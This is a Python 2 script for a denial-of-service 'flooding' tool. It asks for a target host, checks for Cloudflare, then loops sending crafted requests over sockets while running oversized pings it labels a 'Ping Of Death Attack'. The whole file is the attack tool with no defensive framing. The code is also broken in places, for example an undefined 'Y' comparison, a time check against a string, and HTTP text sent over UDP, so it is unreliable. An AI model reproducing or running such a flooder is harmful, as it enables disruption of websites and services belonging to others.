import socket, urllib, requests, time, os
from colored import fg, bg, attr


def attack(url, packets):
   try:
        strt = raw_input("\n  %s%sDo you want to start flooding? [ Y / n ]%s > " % (fg('black'), bg(160), attr(0)))
        if strt == 'y' or strt == Y:
           while 1:
              try:
                if time.time() > packets:
                   break
                else:
                   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                   ltarget = socket.gethostbyname(url)
                   byte = packets
                   ports = 80
                   u = open("user-agents.txt","r");
                   user_agents = u.readline()
                   os.system("ping -s 1000 -w 1 {}".format(ltarget))
                   sock.connect((ltarget,ports))
                   sock.send(str("GET / HTTP/1.1\nHost:{}\n\n User-Agent:{}\n{}".format(ltarget, user_agents, byte)))
                   sock.close()
                   print ("attacking : %s%s| %s | %s | %s |" % (fg('black'), bg('red'), ltarget, ports, attr(0)))
              except KeyboardInterrupt:
                print ("\033[31m[Error] \033[33m keyboard interrupt by user") + "\033[0m"
                time.sleep(1.5)
                break
        elif strt == 'n' or strt == 'N':
           print ""

  # Exceptions

   except socket.error as (msg):
     print ("\033[31m[Error] \033[33mconnection lost") + "\033[0m"
     time.sleep(1.5)
   except socket.gaierror as (msg):
     print ("\033[31m[Error] \033[33merror connecting to socket") + "\033[0m"
     time.sleep(1.5)
   except KeyboardInterrupt:
     print ("\033[31m[Error] \033[33m keyboard interrupt by user") + "\033[0m"
     time.sleep(1.5)
     print ""


def start():
   try:

   # Start Output Start Here

     print ("\nEnter Target [ www.target.com / target.com ] \n")
     print ("\033[1;93m  [?] \033[1;0mIncluding Ping Of Death Attack\n")
     lulz = raw_input("  %s%sTarget Host%s > " % (fg('black'), bg(160), attr(0)))
     if lulz == 'main':
       print ""
     else:
       pack = raw_input("\n  %s%spackets%s > " % (fg('black'), bg(160), attr(0)))

   # Cloudflare!

       time.sleep(1.5)
       print ("\n\033[32m[+]\033[0m Detecting Cloudflare Before Attacking!")
       data = "http://"+lulz #+'/'
       url = urllib.urlopen(data)
       sourcecode = url.read()
       if "used CloudFlare to restrict access</title>" in sourcecode:
             print("\n\033[31m  [ Cloudflare Detected ]")
             print("\033[37m  [status] : %s%scloudflare blocked the ip%s" % (fg('blacl'), bg(160), attr(0)))
             time.sleep(1.5)
       elif "cloudflare" in sourcecode:
             print("\n\033[31m  [ Cloudflare Detected ]")
             print("\033[37m  [status] : %s%scloudflare blocked the ip%s" % (fg('black'), bg(160), attr(0)))
             time.sleep(1.5)
       else:
             print("\n\033[32m  [ No Cloudflare Detected ]")
             print("\033[32m  [status] : %s%sGood%s" % (fg('black'), bg('green'), attr(0)))
             attack(lulz, pack)

   # Exceptions

   except KeyboardInterrupt:
       print ("\033[31m[Error] \033[33m keyboard interrupt by user") + "\033[0m"
       time.sleep(1.5)
       print ""
   except IOError:
       print ("\033[31m[Error] \033[33merror connecting to site") + "\033[0m"
